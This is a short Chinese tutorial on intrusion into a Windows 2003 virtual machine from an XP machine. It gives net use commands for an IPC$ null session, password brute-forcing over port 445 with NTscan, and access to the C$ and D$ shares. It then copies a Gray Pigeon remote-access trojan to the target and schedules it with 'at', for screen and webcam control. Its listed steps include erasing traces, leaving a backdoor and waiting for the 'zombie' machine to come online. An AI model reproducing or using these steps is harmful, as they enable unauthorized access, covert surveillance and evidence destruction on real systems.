渗透简单测试流程

操作基本流程

  • 扫描漏洞（Scanport ）

  • 漏洞利用

  • 提权（拿到对方桌面的最高权限）

  • 毁尸灭迹

  • 留后门

  • 渗透测试报告(正经情况下，需要写测试报告，还需要些解决方案)

操作详细步骤

        一台2003（IP为10.1.1.2）、一台xp虚拟机（IP为10.1.1.1），使用xp渗透虚拟机win2003，

  • 保证两台虚拟机正在同一网段或者网络下，且双方可以相互ping通。

  • 在命令行窗口通过 “telnet 对方IP 端口号” 命令就可以查询对方相应的端口号是否打开，但是会很麻烦，所以这里采用一个小工具ScanPort,进行开放端口的扫描。

  • 使用工具扫描到win2003的开放端口，一般情况下，没有特别设置，电脑的445文件共享端口都是打开的，所以今天主要进行445渗透，因为每个端口都有漏洞，这就是确定目标了。

  • 445漏洞利用之IPC$:空连接后，基本上就可以为所欲为了。

          本次使用共享文件IPC$进行空连接：net use \\10.1.1.2\ipc$ 密码 /user:用户

  • 暴力破解系统密码之445：专门通过445端口进行破解密码的小工具NTscan，暴力破解密码需要用到密码字典，所以信息的收集对生成密码字典很有帮助。暴力破解就是不断运行”net use \10.1.1.2\ipc$ 密码 /user:用户 “此行代码，进行一遍遍的试。

  • 在破解出密码后，就可以使用该命令 “net use \10.1.1.2\ipc$ 密码 /user:用户” ，此时就可以对win2003虚拟机上的所有文件进行增删改查。只要是对文件的操作这里都可以执行。

          如果想访问win003c盘文件 dir \\10.1.1.2\c$
      如果想访问win003d盘文件 dir \\10.1.1.2\d$

  • 接下来就是种个木马、方便下次访问，利用灰鸽子小工具 ，制作一个木马，然后将木马复制到win2003虚拟机上c:\heihei.exe”，使用at 命令设置3分钟后运行该木马，之后在灰鸽子软件上就可以对win2003虚拟机进行任何操作，包括控制屏幕，打开电脑摄像头等等

          复制木马 copy d:\heihei.exe \\10.1.1.2\c$\heihei.exe ------- 意思为复制本机xp d盘下的heihei.exe到win2003c盘下

      设置定时 at \\10.1.1.2 11.11 "c:\heihei.exe" -------------- 意思为在11.11执行c盘下的heihei.exe（你复制木马的地方）文件。

  • 删除c盘下heihei.exe

  • 等待肉鸡上线

        将2003虚拟机上的共享文件夹share映射到本地的f盘：net use f: \\10.1.1.2\share 密码 /user:用户
        删除该映射：net use f: /del 或者 net use f: * del
